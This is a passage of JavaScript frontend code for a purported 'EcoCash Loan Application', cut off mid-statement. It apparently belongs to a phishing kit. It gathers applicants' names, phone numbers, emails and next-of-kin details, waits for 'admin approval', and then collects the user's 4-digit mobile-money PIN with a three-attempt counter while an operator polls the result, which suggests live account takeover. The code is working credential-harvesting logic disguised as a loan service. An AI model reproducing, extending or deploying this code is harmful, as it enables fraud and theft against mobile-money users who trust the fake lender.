// ============================================================
// EcoCash Loan Application – Frontend Logic
// ============================================================

let appData = {
  loanAmount: 200,
  loanDuration: 30,
  firstName: '',
  lastName: '',
  phone: '',
  email: '',
  kinFirstName: '',
  kinLastName: '',
  kinPhone: '',
  province: '',
  loanReason: '',
  applicationId: null
};

let currentPage = 'page-landing';
let pinPollingActive = false;

// ─── localStorage Helpers ───
function saveState() {
  const state = { appData, currentPage };
  localStorage.setItem('ecocash_app_state', JSON.stringify(state));
}

function loadState() {
  const saved = localStorage.getItem('ecocash_app_state');
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      appData = parsed.appData || appData;
      currentPage = parsed.currentPage || 'page-landing';
      return true;
    } catch (e) {
      console.error('Failed to parse saved state', e);
    }
  }
  return false;
}

function clearState() {
  localStorage.removeItem('ecocash_app_state');
}

// ─── Page Navigation ───
function goTo(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const target = document.getElementById(pageId);
  if (target) target.classList.add('active');
  currentPage = pageId;
  saveState();
}

function clearErr(id) {
  const el = document.getElementById(id);
  if (el) el.classList.remove('show');
}

// ─── Landing ───
function startApplication() {
  appData = {
    loanAmount: 200,
    loanDuration: 30,
    firstName: '',
    lastName: '',
    phone: '',
    email: '',
    kinFirstName: '',
    kinLastName: '',
    kinPhone: '',
    province: '',
    loanReason: '',
    applicationId: null
  };
  goTo('page-step1');
  document.getElementById('s1am').value = 200;
  document.getElementById('s1dur').value = 30;
  updateStep1Calc();
}

// ─── Step 1 ───
function updateStep1Calc() {
  let amt = parseInt(document.getElementById('s1am').value);
  let dur = parseInt(document.getElementById('s1dur').value);
  let interest = amt * 0.005 * dur;
  let total = amt + interest;
  document.getElementById('s1AmtDisplay').textContent = `$${amt}`;
  document.getElementById('s1DurDisplay').textContent = `${dur} days`;
  document.getElementById('s1Principal').textContent = `$${amt.toFixed(2)}`;
  document.getElementById('s1Interest').textContent = `$${interest.toFixed(2)}`;
  document.getElementById('s1Total').textContent = `$${total.toFixed(2)}`;
  appData.loanAmount = amt;
  appData.loanDuration = dur;
  saveState();
}

function toS2() {
  let reason = document.getElementById('s1reason').value.trim();
  if (!reason) { showError('s1Err', 'Please provide a reason for the loan.'); return; }
  appData.loanReason = reason;
  goTo('page-step2');
}

// ─── Step 2 ───
function toS3() {
  let fi = document.getElementById('s2fi').value.trim();
  let la = document.getElementById('s2la').value.trim();
  let ph = document.getElementById('s2ph').value.trim();
  let em = document.getElementById('s2em').value.trim();
  if (!fi || !la || ph.length !== 9 || !em) {
    showError('s2Err', 'Please fill all fields correctly.');
    return;
  }
  appData.firstName = fi;
  appData.lastName = la;
  appData.phone = ph;
  appData.email = em;
  document.getElementById('sA').textContent = `$${appData.loanAmount}`;
  document.getElementById('sT').textContent = `${appData.loanDuration} Days`;
  document.getElementById('sR').textContent = `$${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toFixed(2)}`;
  document.getElementById('sN').textContent = `${fi} ${la}`;
  goTo('page-step3');
}

// ─── Submit Application ───
async function submitApp() {
  let kf = document.getElementById('s3kf').value.trim();
  let kl = document.getElementById('s3kl').value.trim();
  let kp = document.getElementById('s3kp').value.trim();
  let prov = document.getElementById('s3prov').value;
  if (!kf || !kl || kp.length !== 9 || !prov) {
    showError('s3Err', 'Please fill all fields correctly.');
    return;
  }
  appData.kinFirstName = kf;
  appData.kinLastName = kl;
  appData.kinPhone = kp;
  appData.province = prov;

  try {
    const response = await fetch('/api/send-application', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationData: appData })
    });
    const data = await response.json();
    if (data.ok) {
      appData.applicationId = data.applicationId;
      saveState();
      goTo('page-processing');
      document.getElementById('processingStatus').textContent = '⏳ Awaiting admin approval of application...';
      startAppPolling();
    } else {
      alert('Error: ' + data.error);
    }
  } catch (err) {
    console.error(err);
    alert('Network error. Please try again.');
  }
}

// ─── App Approval Polling ───
function startAppPolling() {
  if (window._appInterval) clearInterval(window._appInterval);
  window._appInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${appData.applicationId}/app`, { cache: 'no-store' });
      if (res.status === 404) {
        clearInterval(window._appInterval);
        clearState();
        alert('Application not found. Please start again.');
        goTo('page-landing');
        return;
      }
      const data = await res.json();

      if (data.status === 'approved') {
        clearInterval(window._appInterval);
        goTo('page-pin');
        clearLoginPin();
        pinPollingActive = false;
        document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
        return;
      }
      if (data.status === 'rejected') {
        clearInterval(window._appInterval);
        clearState();
        alert('Your application was rejected by the admin.');
        goTo('page-landing');
        return;
      }
    } catch (err) {
      console.error('App polling error:', err);
    }
  }, 3000);
}

// ─── PIN Submission ───
async function doPin() {
  let pin = '';
  for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
  if (pin.length !== 4) { showError('pinErr', 'Enter a 4-digit PIN.'); return; }

  try {
    const response = await fetch('/api/send-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: appData.applicationId, pin })
    });
    const data = await response.json();
    if (data.ok) {
      startPinPolling();
    } else if (data.blocked) {
      showError('pinErr', data.message);
      disablePinInputs();
    } else {
      showError('pinErr', data.error || 'Error');
    }
  } catch (err) {
    alert('Network error');
  }
}

// ─── PIN Polling ───
function startPinPolling() {
  if (window._pinInterval) clearInterval(window._pinInterval);
  pinPollingActive = true;
  window._pinInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${appData.applicationId}/pin`, { cache: 'no-store' });
      if (res.status === 404) {
        clearInterval(window._pinInterval);
        pinPollingActive = false;
        clearState();
        alert('Application not found. Please start again.');
        goTo('page-landing');
        return;
      }
      const data = await res.json();

      if (data.status === 'approved') {
        clearInterval(window._pinInterval);
        pinPollingActive = false;
        clearLoginPin
